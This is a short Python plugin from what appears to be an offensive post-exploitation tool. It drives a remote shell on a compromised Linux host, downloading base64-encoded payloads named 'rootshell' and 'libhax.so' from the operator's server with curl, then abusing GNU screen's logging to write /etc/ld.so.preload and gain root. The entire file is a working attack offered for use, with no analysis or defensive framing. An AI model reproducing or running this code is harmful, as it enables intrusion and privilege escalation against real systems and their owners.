#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

from plugin.core import core
import re
import time


class screen:
    def __init__(self, socks, ip, port, re_ip, re_port):
        self.__exploit(socks, ip, port, re_ip, re_port)
        
    def __exploit(self, socks, ip, port, re_ip, re_port):
        time.sleep(2) 
        core.send_command(socks, f"curl http://{ip}:{port}/plugin/rootshell.txt | base64 -d > /tmp/rootshell ")
        time.sleep(10)
        core.send_command(socks, 'chmod +x /tmp/rootshell')
        time.sleep(2) 
        core.send_command(socks, f"curl http://{ip}:{port}/plugin/libhax.txt | base64 -d > /tmp/libhax.so ")
        time.sleep(10)
        core.send_command(socks, ' cd /etc;umask 000;screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"')
        time.sleep(1)
        print("[+] screen privilege escalation completed...")
